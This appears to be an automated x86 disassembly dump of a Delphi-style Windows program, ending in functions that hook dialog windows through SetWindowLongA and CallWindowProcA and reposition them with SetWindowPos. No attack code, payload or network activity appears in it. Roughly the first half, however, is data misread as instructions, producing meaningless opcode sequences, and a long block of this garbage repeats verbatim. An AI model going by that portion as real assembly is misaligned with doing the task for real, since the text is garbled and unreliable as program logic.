or [ eax + edx * 2 + 0x61 ] edx
push esp
jns r-xdata
outsd
dec ebp
popad
jb r-xdata
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
jb r-xdata
popad
bound ebp [ ebp + 0x4f ]
jo r-xdata
add [ eax + 0x48 ] dl
inc ecx
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
inc eax
add [ edi + eax * 8 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
enter 0x427b 0x0
add [ eax ] al
add [ eax ] al
or [ eax + 0x6d ] dh
arpl [ ecx + eax + 0xb ] si
add [ eax ] cl
andps xmm2 [ eax + 0x61 ]
imul ebp [ esi + 0x74 ] 0x65676150
inc ebp
jbe r-xdata
jo r-xdata
ja r-xdata
popad
jb r-xdata
popad
dec ebp
je r-xdata
push eax
add cl [ ecx ]
push esp
dec edi
inc ebp
add edx [ ecx ]
push esp
push eax
jb r-xdata
push ebx
nop
sbb [ edx + 0x42 ] bh
add [ eax ] cl
sbb dl [ eax + edx * 2 + 0x61 ]
inc esp
jo r-xdata
inc edx
jne r-xdata
fdivr [ ecx + 0x42 ]
jb r-xdata
imul ebp [ esi + 0x74 ] 0x724f7265
imul esp [ ebp + 0x6e ] 0x69746174
imul ebp [ edi + 0x6e ] 0x72505413
insb
outsd
jo r-xdata
imul esp [ ecx + 0x6c ] 0x9073676f
imul esp [ ecx + 0x6c ] 0x704f676f
outsd
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
jb r-xdata
jo r-xdata
je r-xdata
jae r-xdata
add [ edx ] cl
add [ eax ] al
add ah cl
js r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
imul esp [ ecx + 0x6c ] 0x7848676f
inc edx
add ah bl
insd
inc edx
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ ebp + 0x78d00040 ] cl
inc edx
add [ ebx ] al
push ss
push esp
push eax
popad
push ebx
je r-xdata
lea eax [ eax ]
adc [ ebx + 0x42 ] bh
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax ] dl
jpo r-xdata
inc esp
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
xor al [ eax ]
dec eax
xor al [ eax ]
rol [ ebx + 0x48500042 ] 0x41
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx + eax * 2 ] bh
sbb [ ecx ] al
add [ eax ] al
and [ ebp + 0x42 ] ch
outsb
je r-xdata
add [ ecx + edx ] cl
dec ecx
outsb
arpl [ eax + 0x65 ] bp
jae r-xdata
outsb
pop es
inc edx
outsd
outsd
insb
inc esp
or eax [ edi + ebp * 2 + 0x6e ]
inc esp
outsd
outsb
or [ eax + 0x61 ] dl
or [ esi ] al
push ebp
outsb
imul esi [ ebx + esi * 2 + 0x1 ] 0x0
outsd
outsb
mov esp 0x900427a
jo r-xdata
outsb
je r-xdata
adc edx [ eax + edx * 2 + 0x72 ]
outsw
jb r-xdata
je r-xdata
push ebx
je r-xdata
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax + edx ] bh
inc eax
add [ edi + ecx * 2 + 0x42 ] cl
add ah bl
jns r-xdata
imul edi [ edx + 0x65 ] 0x616d5308
insb
insb
push esp
push eax
jb r-xdata
pop es
jo r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
je r-xdata
outsb
outsd
outsb
adc dh [ bx + si + 0x73 ]
outsd
outsb
push ss
jo r-xdata
insb
outsd
jae r-xdata
popad
jo r-xdata
bound ebp [ ebp + 0x50 ]
popad
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sar [ edx + 0x42 ] 0x0
add [ eax ] cl
jl r-xdata
jae r-xdata
arpl [ gs : ecx + eax + 0xb ] si
inc esp
popa
jne r-xdata
add al [ eax ]
add [ eax ] al
je r-xdata
inc esp
outsd
outsb
inc esp
jb r-xdata
add [ ebx ] ecx
push eax
popad
imul ebp [ esi + 0x74 ] 0x6e657645
je r-xdata
outsb
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8b73676f
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x70090042 ] bh
outsb
je r-xdata
outsb
add cl [ eax ]
push eax
popad
push esp
jns r-xdata
add [ ebx + 0x4279e0c0 ] cl
int3
outsd
popad
imul ebp [ esi + 0x74 ] 0xf676e69
jo r-xdata
sar [ ecx + edi * 2 + 0x17060042 ] 0x54
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x5fffbd68 ] bl
test [ edx ] al
hlt
scasb [ edi ]
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add [ esp + eax * 4 ] bl
inc edx
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al al
add [ edx ] 0x50
dec eax
add [ eax ] bl
add [ eax ] eax
push edx
arpl [ gs : ebp + eax + 0x54 ] si
push edx
adc [ eax ] cl
push eax
popad
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
insd
outsd
add eax 0x65530608
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] ah
insd
inc edx
jae r-xdata
jo r-xdata
jb r-xdata
dec ebp
imul ebp [ esp + ebp * 2 + 0x69 ] 0x6574656d
sub_427733
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040006 ] al
outsd
outsb
je r-xdata
pop eax
add [ eax ] al
[ ebx + edx * 4 ]
jne r-xdata
jpe r-xdata
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
inc esp
jbe r-xdata
inc ecx
jo r-xdata
push esp
adc [ eax ] al
dec edi
jo r-xdata
arpl [ ebp + 0x54 ] sp
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ ebp + 0x69 ]
outsb
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x7d ] bh
inc edx
add [ eax - 0xbffbd7c ] ah
add [ edx ] 0xffffffec
test [ edx ] al
add al 0x96
inc edx
add [ ebx ] dl
push esp
push eax
jb r-xdata
insb
jns r-xdata
add [ eax + 0x48 ] dl
imul ebp [ edi + 0x6e ] 0x42762c73
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000b ] al
outsb
insb
add [ eax ] al
[ eax + eax ]
imul edi [ edx + 0x65 ] r-xdata
jo r-xdata
outsb
je r-xdata
inc esi
outsd
outsb
je r-xdata
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
inc eax
add [ eax + 0x78 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4278 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x58004278 ] cl
add [ eax ] al
add [ eax ] ah
insd
inc edx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add [ esp + eax * 4 ] bl
inc edx
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al al
add [ edx ] 0x50
dec eax
or dh [ eax + 0x73 ]
outsd
adc al 0x70
jb r-xdata
mov eax eax
loopne r-xdata
imul ebp [ esi + 0x73 ] 0x6f73700d
dec ebp
je r-xdata
je r-xdata
inc esp
popa
jne r-xdata
imul ebp [ edi + 0x6e ] 0x1
je r-xdata
imul ebp [ esi + 0x74 ] 0x724f0b02
imul esp [ ebp + 0x6e ] 0x69746174
inc edx
or dh [ eax + 0x73 ]
jo r-xdata
imul esi [ ebx + 0x61 ] 0x50656c62
imul ebp [ esi + 0x4d ] 0x69677261
outsb
jae r-xdata
jo r-xdata
jb r-xdata
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
popad
push eax
jae r-xdata
add [ eax + esi * 2 ] dl
adc [ eax + 0x73 ] esi
jo r-xdata
je r-xdata
or [ gs : eax + edx * 2 + 0x61 ] edx
push esp
jns r-xdata
add cl [ ebx ]
dec edi
jb r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah bl
jns r-xdata
push eax
popad
jo r-xdata
imul ebp [ esi + 0x67 ] 0x6f737012
je r-xdata
outsd
pop ss
push esp
jb r-xdata
adc eax 0x446f7370
jo r-xdata
je r-xdata
add [ ebx ] al
imul ebp [ edi + 0x6e ] 0x78cc0373
inc edx
imul ebp [ esi + 0x4d ] 0x69677261
outsb
jae r-xdata
or eax 0x4d6f7370
jo r-xdata
push eax
popad
push ebx
je r-xdata
outsd
inc esp
push ebx
push 0x6548776f
insb
imul ebp [ bp + 0x73 ] 0x6f73700b
imul esi [ ebx + 0x61 ] 0x4f656c62
imul ebp [ esi + 0x73 ] 0x6f737015
inc esp
jo r-xdata
imul esp [ ecx + 0x6c ] 0x78a0676f
inc edx
add [ edi ] al
adc edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x65537265
je r-xdata
popad
jb r-xdata
push 0x44077365
add [ gs : ebx ] ecx
popad
jae r-xdata
outsb
je r-xdata
outsb
add [ edx ] cl
jo r-xdata
jb r-xdata
jb r-xdata
popad
outsd
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x9 ] si
outsb
jbe r-xdata
dec esi
outsd
dec esi
je r-xdata
adc dh [ eax + 0x73 ]
jo r-xdata
jb r-xdata
jo r-xdata
jo r-xdata
outsd
push edi
popad
jb r-xdata
outsb
je r-xdata
outsd
inc esp
imul esi [ ebx + 0x61 ] 0x4d656c62
popad
jb r-xdata
popad
jo r-xdata
or [ eax + 0x61 ] edx
or [ eax + edx * 2 + 0x61 ] edx
push esp
jns r-xdata
outsd
dec ebp
popad
jb r-xdata
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
jb r-xdata
popad
bound ebp [ ebp + 0x4f ]
jo r-xdata
add [ eax + 0x48 ] dl
inc ecx
outsb
pop es
inc edx
outsd
outsd
insb
popad
outsb
inc eax
add [ edi + eax * 8 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
enter 0x427b 0x0
add [ eax ] al
add [ eax ] al
or [ eax + 0x6d ] dh
arpl [ ecx + eax + 0xb ] si
add [ eax ] cl
andps xmm2 [ eax + 0x61 ]
imul ebp [ esi + 0x74 ] 0x65676150
inc ebp
jbe r-xdata
jo r-xdata
ja r-xdata
popad
jb r-xdata
popad
dec ebp
je r-xdata
push eax
add cl [ ecx ]
push esp
dec edi
inc ebp
add edx [ ecx ]
push esp
push eax
jb r-xdata
push ebx
nop
sbb [ edx + 0x42 ] bh
add [ eax ] cl
sbb dl [ eax + edx * 2 + 0x61 ]
inc esp
jo r-xdata
inc edx
jne r-xdata
fdivr [ ecx + 0x42 ]
jb r-xdata
imul ebp [ esi + 0x74 ] 0x724f7265
imul esp [ ebp + 0x6e ] 0x69746174
imul ebp [ edi + 0x6e ] 0x72505413
insb
outsd
jo r-xdata
imul esp [ ecx + 0x6c ] 0x9073676f
imul esp [ ecx + 0x6c ] 0x704f676f
outsd
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
jb r-xdata
jo r-xdata
je r-xdata
jae r-xdata
add [ edx ] cl
add [ eax ] al
add ah cl
js r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
imul esp [ ecx + 0x6c ] 0x7848676f
inc edx
add ah bl
insd
inc edx
add [ esi ] al
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ ebp + 0x78d00040 ] cl
inc edx
add [ ebx ] al
push ss
push esp
push eax
popad
push ebx
je r-xdata
lea eax [ eax ]
adc [ ebx + 0x42 ] bh
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax ] dl
jpo r-xdata
inc esp
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
xor al [ eax ]
dec eax
xor al [ eax ]
rol [ ebx + 0x48500042 ] 0x41
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ edx + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx + eax * 2 ] bh
sbb [ ecx ] al
add [ eax ] al
and [ ebp + 0x42 ] ch
outsb
je r-xdata
add [ ecx + edx ] cl
dec ecx
outsb
arpl [ eax + 0x65 ] bp
jae r-xdata
outsb
pop es
inc edx
outsd
outsd
insb
inc esp
or eax [ edi + ebp * 2 + 0x6e ]
inc esp
outsd
outsb
or [ eax + 0x61 ] dl
or [ esi ] al
push ebp
outsb
imul esi [ ebx + esi * 2 + 0x1 ] 0x0
outsd
outsb
mov esp 0x900427a
jo r-xdata
outsb
je r-xdata
adc edx [ eax + edx * 2 + 0x72 ]
outsw
jb r-xdata
je r-xdata
push ebx
je r-xdata
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax + edx ] bh
inc eax
add [ edi + ecx * 2 + 0x42 ] cl
add ah bl
jns r-xdata
imul edi [ edx + 0x65 ] 0x616d5308
insb
insb
push esp
push eax
jb r-xdata
pop es
jo r-xdata
jb r-xdata
outsd
outsb
jae r-xdata
je r-xdata
outsb
outsd
outsb
adc dh [ bx + si + 0x73 ]
outsd
outsb
push ss
jo r-xdata
insb
outsd
jae r-xdata
popad
jo r-xdata
bound ebp [ ebp + 0x50 ]
popad
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sar [ edx + 0x42 ] 0x0
add [ eax ] cl
jl r-xdata
jae r-xdata
arpl [ gs : ecx + eax + 0xb ] si
inc esp
popa
jne r-xdata
add al [ eax ]
add [ eax ] al
je r-xdata
inc esp
outsd
outsb
inc esp
jb r-xdata
add [ ebx ] ecx
push eax
popad
imul ebp [ esi + 0x74 ] 0x6e657645
je r-xdata
outsb
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x8b73676f
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x70090042 ] bh
outsb
je r-xdata
outsb
add cl [ eax ]
push eax
popad
push esp
jns r-xdata
add [ ebx + 0x4279e0c0 ] cl
int3
outsd
popad
imul ebp [ esi + 0x74 ] 0xf676e69
jo r-xdata
sar [ ecx + edi * 2 + 0x17060042 ] 0x54
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x5fffbd68 ] bl
test [ edx ] al
hlt
scasb [ edi ]
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add [ esp + eax * 4 ] bl
inc edx
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al al
add [ edx ] 0x50
dec eax
add [ eax ] bl
add [ eax ] eax
push edx
arpl [ gs : ebp + eax + 0x54 ] si
push edx
adc [ eax ] cl
push eax
popad
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
insd
outsd
add eax 0x65530608
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] ah
insd
inc edx
jae r-xdata
jo r-xdata
jb r-xdata
dec ebp
imul ebp [ esp + ebp * 2 + 0x69 ] 0x6574656d
sub_42825c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4548f8
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_450e98
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_450e98
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_4545fc
mov edi eax
mov eax ebx
call sub_4545e0
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_4545c8
mov edi eax
mov eax ebx
call sub_454614
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_428310
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42825c
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_428378
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
mov [ esi + 0x30 ] 0x1
push esi
push sub_428454
call sub_41b9d4
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4283c0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
call sub_41ba6c
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4283f4
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4572ec
mov cl 0x1
sub_42841c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034cc
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_428454
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42847e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4284ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44dcdc
mov [ ebp - 0x14 ] eax
call sub_44dbf8
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4285af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456bdc
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_428581
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428588
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456c38
retn
sub_428588
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4285b6
mov eax [ ebp - 0x14 ]
call sub_44dd90
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44dc00
retn
sub_4285e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_42825c
sub_42866c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_428378
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4286e5
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_403294
mov eax [ esi + 0x58 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4283c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_428720
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_428da8
mov eax edi
mov si 0xffed
call sub_403490
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_428748
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_4284a0
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_42878c ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_428720
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403490
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_403490
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_403490
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_403490
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_403490
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_428844
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_4288cc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4288fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_41866c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428905
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_428908
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41acbc
push ebx
push sub_4288cc
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_42894c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404050
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_40435c
mov eax [ ebx ]
call sub_404510
mov dl 0x7c
call sub_40c3ac
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c3ac
test eax eax
jne r-xdata
sub_42899c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428c4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402ca4
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_42894c
mov eax [ ebp - 0x8 ]
call sub_404510
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_404510
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_40469c
mov eax [ ebp - 0xc ]
call sub_404510
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402ca4
mov eax [ ebx + 0x78 ]
call sub_404510
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408698
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_404510
mov [ ebp - 0x38 ] eax
